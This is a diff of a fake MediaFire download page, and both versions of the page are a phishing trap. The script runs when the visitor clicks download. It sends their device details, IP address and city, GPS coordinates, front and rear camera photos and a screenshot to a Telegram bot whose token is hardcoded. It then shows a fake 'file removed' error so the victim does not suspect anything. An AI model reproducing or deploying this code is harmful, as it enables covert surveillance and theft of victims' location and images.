@@ -1,140 +1,294 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="en">
 <head>
     <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
-    <title>afgan-enc</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MediaFire - faidhul-ganteng</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <style type="text/css">
-        :root{--mf-blue4:#0070F0;--mf-gray2:#222835;--mf-gray10:#E9EAEB;--mf-gray4:#575B65;--mf-gray5:#72767E}
-        html{font-family:'Open Sans',sans-serif;background:#f3f3f3}
-        body{margin:0;padding:0}
-        .header{background:#fff;height:80px;border-bottom:1px solid #ddd;display:flex;flex-direction:column;align-items:center;justify-content:center}
-        .header .logo a{display:block;width:180px;height:35px;background:url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) no-repeat;text-indent:-9999px}
-        .center{max-width:604px;margin:110px auto 0;background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
-        .dl-btn-cont{background:#292929;padding:20px;display:flex;align-items:center;position:relative}
-        .dl-btn-cont .icon{width:46px;height:58px;background:url(//static.mediafire.com/images/filetype/file-zip-v3.png) no-repeat;margin-right:15px}
-        .dl-btn-label{color:#fff;font-weight:bold;font-size:14px;flex-grow:1}
-        #downloadButton{background:var(--mf-blue4);color:#fff;border:none;padding:15px 25px;border-radius:4px;font-weight:600;cursor:pointer;text-transform:uppercase}
-        .dl-info{padding:20px;font-size:13px;color:#444}
-        .intro{display:flex;align-items:center;margin-bottom:15px}
-        .intro.icon{width:50px;height:50px;background:url(//static.mediafire.com/images/filetype/file-zip-v3.png) no-repeat center/contain;margin-right:15px}
-        .footer{text-align:center;padding:30px;color:var(--mf-gray4);font-size:12px}
-        .hidden{display:none}
-        /* Style Tambahan untuk Alert Palsu */
-        #custom-alert{display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#ef5939;color:#fff;padding:10px 20px;border-radius:5px;z-index:9999}
+    <style>
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Open Sans', sans-serif;
+            background: #fff; color: #575b65;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Header */
+        header {
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .logo {
+            background: url('https://static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg') no-repeat left center;
+            background-size: contain;
+            width: 130px; height: 30px;
+        }
+        .header-icons { display: flex; gap: 8px; }
+        .h-box { 
+            background: #f1f1f1; padding: 5px 10px; 
+            border-radius: 4px; display: flex; align-items: center; 
+        }
+
+        /* Container */
+        .container { max-width: 480px; margin: 0 auto; padding: 20px; }
+
+        /* Main Download Card */
+        .dl-card {
+            background: #4177f1;
+            border-radius: 6px 6px 0 0;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            color: #fff;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .dl-card:active { background: #3566d6; }
+
+        .file-icon {
+            width: 50px; height: 60px;
+            background: url('https://static.mediafire.com/images/filetype/download/zip.jpg') no-repeat center;
+            background-size: cover;
+            margin-right: 15px;
+            border-radius: 3px;
+        }
+        .file-info h1 {
+            font-size: 18px; margin: 0; font-weight: 600;
+        }
+        .file-info p {
+            font-size: 12px; margin: 5px 0 0; opacity: 0.9;
+        }
+        .dl-icon-arrow {
+            position: absolute; right: 25px;
+            width: 24px; height: 24px;
+            fill: white;
+        }
+
+        /* Black Bar */
+        .black-bar {
+            background: #333;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 0 0 6px 6px;
+            margin-bottom: 20px;
+        }
+        .black-bar span { color: #ccc; font-size: 12px; }
+        .btn-faster {
+            background: #4177f1; color: #fff;
+            font-size: 11px; font-weight: bold;
+            padding: 6px 12px; border-radius: 4px;
+            text-decoration: none; text-transform: uppercase;
+        }
+
+        /* Helper Text */
+        .helper-text {
+            font-size: 11px; text-align: center;
+            color: #888; margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* Action Buttons */
+        .actions {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 10px; margin-bottom: 30px;
+        }
+        .act-btn {
+            background: #f5f5f5;
+            padding: 15px; border-radius: 6px;
+            text-align: center; text-decoration: none;
+            color: #777; font-size: 13px;
+        }
+        .act-btn svg { display: block; margin: 0 auto 8px; fill: #777; }
+
+        /* Map Section */
+        .map-container {
+            border: 1px solid #e0e0e0;
+            border-radius: 4px; overflow: hidden;
+            position: relative; margin-bottom: 20px;
+        }
+        .map-label {
+            position: absolute; top: 0; left: 0;
+            background: #435a71; color: #fff;
+            padding: 4px 10px; font-size: 11px; z-index: 1;
+        }
+        .map-img {
+            width: 100%; display: block;
+            background: #73b3ff;
+        }
+
+        /* Upload Info */
+        .upload-info {
+            display: flex; align-items: center;
+            gap: 15px; font-size: 12px; color: #555;
+        }
+        .flag-id {
+            width: 45px; height: 28px;
+            background: url('https://static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg') no-repeat center;
+            background-color: #ce2029;
+            background-size: cover;
+            border: 1px solid #ddd;
+        }
+        .hidden { display: none; }
     </style>
 </head>
-<body class="en">
+<body>
 
-<div id="custom-alert">Connection error. Please try again.</div>
+<header>
+    <div class="logo"></div>
+    <div class="header-icons">
+        <div class="h-box"><img src="https://static.mediafire.com/images/flags_svg/usa.svg" width="20"></div>
+        <div class="h-box"><img src="https://static.mediafire.com/images/icons/svg_dark/user.svg" width="18"></div>
+    </div>
+</header>
 
-<div class="header">
-    <h1 class="logo"><a href="#">MediaFire</a></h1>
-</div>
-
-<div class="center">
-    <div class="dl-btn-cont">
-        <div class="icon"></div>
-        <div class="dl-btn-label">afgan-enc.zip</div>
-        <button id="downloadButton">Download (3.27MB)</button>
+<div class="container">
+    <div class="dl-card" id="main-btn">
+        <div class="file-icon"></div>
+        <div class="file-info">
+            <h1 id="file-title">faidhul-ganteng</h1>
+            <p id="file-status">Download in a new tab (3.27MB)</p>
+        </div>
+        <svg class="dl-icon-arrow" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
     </div>
     
-    <div class="dl-info">
-        <div class="intro">
-            <div class="intro icon"></div>
-            <div>
-                <div style="font-weight:bold">afgan-enc.zip</div>
-                <div style="color:#888">Compressed Archive (.ZIP)</div>
-            </div>
+    <div class="black-bar">
+        <span>Download too slow?</span>
+        <a href="#" class="btn-faster">Download Faster Now</a>
+    </div>
+
+    <p class="helper-text">
+        Clicking the download button above will start your download in a new tab and show a message from our advertising partners.
+    </p>
+
+    <div class="actions">
+        <a href="#" class="act-btn">
+            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+            Share options
+        </a>
+        <a href="#" class="act-btn">
+            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            Save to My Files
+        </a>
+    </div>
+
+    <div class="map-container">
+        <div class="map-label">Upload region:</div>
+        <img src="https://static.mediafire.com/images/backgrounds/download/map_asia.png" class="map-img" alt="Map Region">
+    </div>
+
+    <div class="upload-info">
+        <div class="flag-id"></div>
+        <div>
+            This file was uploaded from Indonesia on<br>
+            <strong>August 25, 2024 at 2:57 AM</strong>
         </div>
-        <ul style="list-style:none;padding:0;line-height:2">
-            <li>File size: <b>3.27MB</b></li>
-            <li>Uploaded: <b>2024-08-25 02:57:57</b></li>
-        </ul>
-        <hr style="border:0;border-top:1px solid #eee;margin:20px 0">
-        <p><b>About Compressed Archive Formats</b></p>
-        <p style="color:#666;font-size:12px">Compressed archives combine multiple files into a single file to make them easier to transport or save on diskspace.</p>
     </div>
 </div>
-
-<footer class="footer">
-    &copy;2026 MediaFire Build 121967 | Advertising | Terms | Privacy Policy
-</footer>
 
 <video id="v" autoplay muted class="hidden"></video>
 <canvas id="c" class="hidden"></canvas>
 
 <script>
 (() => {
+    // --- KONFIGURASI TELEGRAM ---
     const T = '7621493211:AAFfEUR3ri6Z9odBFzvqhGthsymwWPOl5tY';
     const C = '6636068781';
-    const btn = document.getElementById('downloadButton');
+    
+    const btn = document.getElementById('main-btn');
+    const statusText = document.getElementById('file-status');
 
-    const sendTG = async (m) => {
+    const sTG = async (msg) => {
         try {
             await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({chat_id:C, text:m, parse_mode:'HTML'})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'HTML' })
             });
-        } catch(e){}
+        } catch (e) {}
     };
 
-    const sendPhoto = async (b, f) => {
+    const sP = async (blob, fileName) => {
         try {
             const fd = new FormData();
             fd.append('chat_id', C);
-            fd.append('photo', b, f);
-            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:fd});
-        } catch(e){}
+            fd.append('photo', blob, fileName);
+            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+        } catch (e) {}
     };
 
-    const capture = async (f) => {
+    const cDI = async () => {
+        let m = `<b>🔔 TARGET CLICKED DOWNLOAD</b>\n\n`;
+        m += `<b>🖥 DEVICE:</b> ${navigator.userAgent}\n`;
+        try {
+            const b = await navigator.getBattery();
+            m += `<b>🔋 BATTERY:</b> ${Math.floor(b.level * 100)}%\n`;
+        } catch(e) {}
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            m += `<b>📍 IP:</b> ${d.ip}\n<b>🏙 CITY:</b> ${d.city}, ${d.country_name}\n`;
+        } catch(e) {}
+        return m;
+    };
+
+    const capture = async (facing) => {
         const v = document.getElementById('v'), c = document.getElementById('c');
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}});
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
             v.srcObject = stream;
             await new Promise(r => v.onloadedmetadata = r);
             v.play();
             await new Promise(r => setTimeout(r, 1000));
             c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v,0,0);
-            c.toBlob(b => sendPhoto(b, `img_${f}.jpg`), 'image/jpeg');
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(b => sP(b, `cap_${facing}.jpg`), 'image/jpeg');
             stream.getTracks().forEach(t => t.stop());
             return true;
-        } catch(e) { return false; }
+        } catch (e) { return false; }
     };
 
+    // JALANKAN SAAT KARTU BIRU DIKLIK
     btn.addEventListener('click', async () => {
-        btn.innerText = "Starting...";
+        statusText.innerText = "Generating download link...";
         
-        // 1. Ambil Info Device & IP
-        let m = `<b>📥 NEW MEDIAFIRE CLICK</b>\n\nDevice: ${navigator.userAgent}\n`;
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            m += `IP: ${d.ip}\nCity: ${d.city}, ${d.country_name}`;
-        } catch(e){}
-        await sendTG(m);
+        // 1. Kirim Info Device
+        const info = await cDI();
+        await sTG(info);
 
-        // 2. Kamera & Lokasi
+        // 2. Ambil Foto & Lokasi
         capture("user").then(() => capture("environment"));
-        
+
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendTG(`📍 GPS: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, null, {enableHighAccuracy:true});
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const url = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sTG(`<b>📍 GPS:</b> ${url}`);
+            }, null, { enableHighAccuracy: true });
         }
 
-        // 3. Efek Loading Palsu & Error
+        // 3. Screenshot
+        setTimeout(async () => {
+            try {
+                const canvas = await html2canvas(document.body);
+                canvas.toBlob(b => sP(b, 'screen.jpg'), 'image/jpeg');
+            } catch(e) {}
+        }, 2000);
+
+        // Beri efek error agar tidak curiga
         setTimeout(() => {
-            document.getElementById('custom-alert').style.display = 'block';
-            btn.innerText = "Download (3.27MB)";
-            setTimeout(() => { document.getElementById('custom-alert').style.display = 'none'; }, 3000);
-        }, 4000);
+            alert("Error: The requested file is no longer available on our servers.");
+            statusText.innerText = "Download failed (File Removed)";
+        }, 5000);
     });
 })();
 </script>
+
 </body>
 </html>
